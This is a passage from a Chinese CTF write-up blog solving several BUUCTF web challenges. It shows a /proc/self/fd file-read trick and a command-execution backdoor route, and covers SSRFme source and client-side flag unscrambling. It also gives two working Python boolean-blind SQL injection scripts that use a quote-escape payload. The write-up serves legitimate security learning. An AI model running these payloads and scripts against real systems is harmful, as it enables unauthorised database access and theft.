SECRET_KEY:<br>        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.system(shell)<br>        res = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure><p>主要就是<code>/no_one_know_the_manager</code>这个路由，它会判断传进来的key参数和静态变量SECRET_KEY是否相等，相等的话就使用<code>os.system()</code>方法执行传进来的shell参数(不过注意这里是没回显的)。</p><p><code>SECRET_KEY</code>获取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span> <br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)       <span class="hljs-comment"># 用open()打开/tmp/secret.txt文件</span><br>SECRET_KEY = f.read().strip()      <span class="hljs-comment"># 读取secret.txt文件，将内容赋给SECRET_KEY</span><br>os.remove(SECRET_FILE) <span class="hljs-comment">#删除/tmp/secret.txt文件</span><br></code></pre></td></tr></table></figure><p>根据上面那篇文章可以知道：</p><p><strong>在 linux  系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p><p>&#x2F;proc&#x2F;[pid]&#x2F;fd 这个目录里包含了进程打开文件的情况，目录里面有一堆&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;id文件，id就是进程记录的打开文件的文件描述符的序号。接下来可以通过手动输或者爆破去拿数据。我很懒所以直接照着<code>wp</code>里的结果尝试了。。</p><p><code>/page?url=/proc/self/fd/3</code></p><p><img src="/img/picdown7.png" alt="picdown7"></p><p>拿到<code>SECRET_KEY</code>后面就是<code>GET</code>传参<code>shell</code></p><p>后面就是反弹<code>shell</code>了。。但我的<code>VPS</code>还没弄好所以这个坑就先留着，这里用非预期读了flag：</p><p><img src="/img/picdown4.png" alt="picdown4"></p><h2 id="HITCON-2017-SSRFme-未做完"><a href="#HITCON-2017-SSRFme-未做完" class="headerlink" title="[HITCON 2017]SSRFme(未做完)"></a>[HITCON 2017]SSRFme(未做完)</h2><p><img src="/img/hihtssrfme1.png" alt="hihtssrfme1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$http_x_headers</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>        <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-comment">//HTTP_X_FORWARDED_FOR可以伪造</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]; <span class="hljs-comment">//10.244.80.12</span><br><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<span class="hljs-comment">//MD5加密</span><br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//创建目录</span><br>    @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//切换至目录</span><br><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;GET &quot;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>    <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>    <span class="hljs-variable">$dir</span>  = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<span class="hljs-comment">//把文件名中的.换成空</span><br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>    @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$dir</span>);<br>    @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>)<br></code></pre></td></tr></table></figure><p>代码很好理解，主要有这么个东西：</p><p><code>$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</code></p><p><code>shell_exec</code>执行的参数是<code>GET</code>+<code>url</code>经过转义的值。。题还是做的太少了，<code>GET</code>命令第一次碰到，搜了搜GET命令执行漏洞</p><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>这题页面刷新的很快就抓包看了。。</p><p><img src="/img/welcometoearth1.png" alt="welcometoearth1"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">document</span>.<span class="hljs-property">onkeydown</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  event = event || <span class="hljs-variable language_">window</span>.<span class="hljs-property">event</span>;<br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">keyCode</span> == <span class="hljs-number">27</span>) &#123; <span class="hljs-comment">//若按下esc</span><br>    event.<span class="hljs-title function_">preventDefault</span>();<span class="hljs-comment">//阻止浏览器跳转到其他页面</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/chase/&quot;</span>;<span class="hljs-comment">//将当前页面的 URL 设置为 &quot;/chase/&quot;，实现页面跳转到 &quot;/chase/&quot;</span><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-title function_">die</span>();<span class="hljs-comment">//否则调用die函数</span><br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">dietimer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">10000</span>); <span class="hljs-comment">//等待十秒调用die函数</span><br>  <span class="hljs-title function_">die</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">die</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<span class="hljs-comment">//页面跳转到die</span><br>&#125;<br><br><span class="hljs-title function_">dietimer</span>();<br></code></pre></td></tr></table></figure><p>我们看看<code>chase</code>页面：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>     &#125;<br><br>     <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">dietimer</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">1000</span>);<br>       <span class="hljs-title function_">die</span>();<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">die</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">left</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">leftt</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/leftt/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">right</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-title function_">dietimer</span>();<br></code></pre></td></tr></table></figure><p>我们跳转到<code>leftt</code>：</p><p><img src="/img/welcometoearth2.png" alt="welcometoearth2"></p><p>跳转到<code>/shoot/</code>:</p><p><img src="/img/welcometoerath3.png" alt="welcometoerath3"></p><p>跳转到<code>/door</code>，是这么个东西:</p><p><img src="/img/welcometoooooooooooooooooooearth4.png" alt="welcometoooooooooooooooooooearth4"></p><p>大致就是选择一个数字，选错了就跳转到<code>/die/</code>界面</p><p>一开始以为是要爆破。。但看了会儿发现不知道怎么提交的这个参数，看源码发现有这么个东西：</p><p><code>/static/js/door.js</code>，访问：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check_door</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> all_radio = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;door_form&quot;</span>).<span class="hljs-property">elements</span>;<br>  <span class="hljs-keyword">var</span> guess = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; all_radio.<span class="hljs-property">length</span>; i++)<br>    <span class="hljs-keyword">if</span> (all_radio[i].<span class="hljs-property">checked</span>) guess = all_radio[i].<span class="hljs-property">value</span>;<br><br>  rand = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">360</span>);<br>  <span class="hljs-keyword">if</span> (rand == guess) <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/open/&quot;</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>大致意思就是猜数，他这个应该没有检验啥的，我们直接跳过去<code>open</code>下看看：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">open</span>(<span class="hljs-params">i</span>) &#123;<br>  <span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">open</span>(i + <span class="hljs-number">1</span>);<br>  &#125;);<br>  <span class="hljs-keyword">if</span> (i == <span class="hljs-number">4000000000</span>) <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/fight/&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接去<code>fight</code>，看源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Run to scramble original flag</span><br><span class="hljs-comment">//console.log(scramble(flag, action));</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scramble</span>(<span class="hljs-params">flag, key</span>) &#123;<span class="hljs-comment">//flag会被混淆，key是混淆用的秘钥</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; key.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">let</span> n = key.<span class="hljs-title function_">charCodeAt</span>(i) % flag.<span class="hljs-property">length</span>;<br>    <span class="hljs-keyword">let</span> temp = flag[i];<br>    flag[i] = flag[n];<br>    flag[n] = temp;<br>  &#125;<br>  <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check_action</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> action = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;action&quot;</span>).<span class="hljs-property">value</span>;<br>  <span class="hljs-keyword">var</span> flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>];<br><br>  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> unscramble function</span><br>&#125;<br></code></pre></td></tr></table></figure><p>使用一个<code>for</code>循环来遍历密钥的每个字符。在每次迭代中，它通过<code>key.charCodeAt(i)</code>获取密钥字符的ASCII码，并将其与原始标志的长度取模，得到一个索引值<code>n</code>。然后，它使用一个临时变量<code>temp</code>来保存原始标志中的第<code>i</code>个字符。接下来，它将原始标志中的第<code>i</code>个字符替换为原始标志中的第<code>n</code>个字符，并将原始标志中的第<code>n</code>个字符替换为<code>temp</code>。这样就实现了对原始标志的混淆。</p><p>下面那个就是被打乱顺序的<code>flag</code>，要把它拼成正确的顺序。</p><p><code>pctf</code>的话肯定放在第一位，然后就是<code>&#123;hey</code>，中间不知道，结尾是<code>ck!&#125;</code></p><p>参考<code>https://www.cnblogs.com/upfine/p/16542916.html</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><span class="hljs-keyword">import</span> re<br><br>flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>]<br><span class="hljs-comment"># 对flag字典里的内容进行排列组合</span><br>item = permutations(flag) <span class="hljs-comment">#permutations函数通常用于生成给定集合的所有排列</span><br><span class="hljs-comment"># 遍历</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> item:<br>    k = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">list</span>(a))<br>    <span class="hljs-comment"># 匹配</span><br>    <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">&#x27;^pctf\&#123;hey_boys[a-zA-z_]+ck!\&#125;$&#x27;</span>, k):<br>        <span class="hljs-built_in">print</span>(k)<br></code></pre></td></tr></table></figure><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p><img src="/img/ciscneasyweb1.png" alt="ciscneasyweb1"></p><p>登陆界面，先用<code>dirsearch</code>扫，发现存在<code>robots.txt</code>:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>*.php.bak<br></code></pre></td></tr></table></figure><p>不过没告诉是啥。。看下源码，注意：</p><p><img src="/img/ciscneasyweb3.png" alt="ciscneasyweb3"></p><p><code>image.php</code>进去就是个图片，<code>user.php</code>进不去，回到<code>index.php</code>了。用这三个文件试试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//image.php.bak，另外两个没有</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure><p>这里对<code>id</code>进行了两次处理：第一次<code>addslashes</code>第二次<code>str_replace</code>。看了<code>wp</code>知道这里存在单引号逃逸的问题，比如我输入<code>\\0</code>，先经过<code>addslashes</code>会变成<code>\\\\0</code>，其中<code>\\0</code>会被替换成空剩<code>\\</code>，这东西会把后面紧跟的<code>&#39;</code>给转义，比如：</p><p><code>select * from iamges where id=&#39;\\&#39; or path=&#39; or 1=1 # &#39;</code></p><p>这时<code>id</code>的值是<code>&#39; or path=</code>，后面那个单引号注释掉就行。</p><p><code>/image.php?id=\\0&amp;path=or 1=1 %23</code></p><p><img src="/img/ciscneasyweb4.png" alt="ciscneasyweb4"></p><p><code>/image.php?id=\\0&amp;path=or 1=0 %23</code></p><p><img src="/img/ciscneasyweb5.png" alt="ciscneasyweb5"></p><p>布尔盲注，先看看要怎么区分这两个页面(其实就是id&#x3D;1和id&#x3D;0)：</p><p><code>id=1</code></p><p><img src="/img/ciscneasyweb6.png" alt="ciscneasyweb6"></p><p><code>id=0</code></p><p><img src="/img/ciscneasyweb7.png" alt="ciscneasyweb7"></p><p>通过<code>JF</code>区分就行:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://3c0a9f91-d286-48a3-9bac-5dc484fbca9a.node4.buuoj.cn:81/image.php&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">30</span>):<br>    right = <span class="hljs-number">127</span><br>    left = <span class="hljs-number">32</span><br>    mid = (right + left)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        payload = <span class="hljs-string">&quot; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)<br>        params = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;\\0&#x27;</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span>: payload<br>        &#125;<br>        response = requests.get(url, params=params)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        mid = (right + left)//<span class="hljs-number">2</span><br><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><code> images,users</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://3c0a9f91-d286-48a3-9bac-5dc484fbca9a.node4.buuoj.cn:81/image.php&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">30</span>):<br>    right = <span class="hljs-number">127</span><br>    left = <span class="hljs-number">32</span><br>    mid = (right + left)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        payload = <span class="hljs-string">&quot; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)<br>        params = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;\\0&#x27;</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span>: payload<br>        &#125;<br>        response = requests.get(url, params=params)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        mid = (right + left)//<span class="hljs-number">2</span><br><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>id,path,username,password</p><p>注意这里不能直接’users’因为单引号被过滤了，要么直接爆库里的所有列名，要么和其它师傅一样把<code>&#39;users&#39;</code>这个字符串转换成十六进制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 